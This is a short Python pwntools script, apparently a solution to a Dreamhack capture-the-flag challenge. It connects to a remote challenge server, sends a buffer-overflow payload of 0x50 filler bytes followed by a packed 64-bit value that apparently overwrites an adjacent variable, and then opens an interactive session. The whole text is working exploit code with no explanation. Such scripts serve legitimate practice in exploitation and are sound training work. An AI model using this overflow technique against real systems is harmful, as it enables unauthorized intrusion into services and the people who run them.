from pwn import *

#p = process('./chall')
p = remote('host3.dreamhack.games', 17413)
payload = b"A"*0x50 + p64(1)

p.sendafter(b": ", payload)
p.interactive()